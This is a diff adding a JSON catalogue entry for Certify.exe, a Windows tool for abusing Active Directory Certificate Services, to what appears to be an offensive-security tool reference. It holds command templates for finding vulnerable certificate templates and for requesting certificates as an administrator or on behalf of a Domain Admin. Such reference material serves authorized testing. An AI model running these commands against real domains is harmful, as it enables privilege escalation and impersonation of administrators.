@@ -2049,6 +2049,58 @@
       ]
     },
     {
+      "name": "certify",
+      "platform": "windows",
+      "aliases": [
+        "Certify.exe"
+      ],
+      "category": "network-ad",
+      "purpose": "On-host AD CS (ADCS) abuse tool for Windows - the .NET counterpart to certipy. Enumerates certificate templates and CA misconfigurations (ESC1-ESC8), then requests a certificate as a chosen principal (e.g. a Domain Admin) from inside a session.",
+      "phases": [
+        "enumeration",
+        "privesc",
+        "exploitation"
+      ],
+      "techniques": [
+        "AD CS enumeration",
+        "ESC1 template abuse",
+        "ESC6 SAN abuse",
+        "certificate-based authentication"
+      ],
+      "docs": "https://github.com/GhostPack/Certify",
+      "templates": [
+        {
+          "label": "Find vulnerable certificate templates",
+          "template": "Certify.exe find /vulnerable",
+          "note": "Read-only enumeration - start here to see which ESC paths exist."
+        },
+        {
+          "label": "Request a cert as another user (ESC1/ESC6)",
+          "template": "Certify.exe request /ca:<ca> /template:<template-name> /altname:administrator",
+          "note": "Enrols a certificate with a chosen SAN; pair with Rubeus asktgt to authenticate."
+        },
+        {
+          "label": "Enrol on behalf of a DA (ESC3)",
+          "template": "Certify.exe request /ca:<ca> /template:<template-name> /onbehalfof:<domain>\\administrator /enrollcert:agent.pfx",
+          "note": "Uses an enrollment-agent cert to request on behalf of a Domain Admin."
+        }
+      ],
+      "flags": [
+        {
+          "flag": "/vulnerable",
+          "what": "filter enumeration to templates with an escalation path"
+        },
+        {
+          "flag": "/altname:",
+          "what": "the SAN (user to impersonate) on the requested cert"
+        },
+        {
+          "flag": "/ca:",
+          "what": "target certificate authority"
+        }
+      ]
+    },
+    {
       "name": "evil-winrm",
       "category": "network-ad",
       "purpose": "WinRM shell client — the standard way to use recovered Windows credentials interactively once the account is in Remote Management Users.",
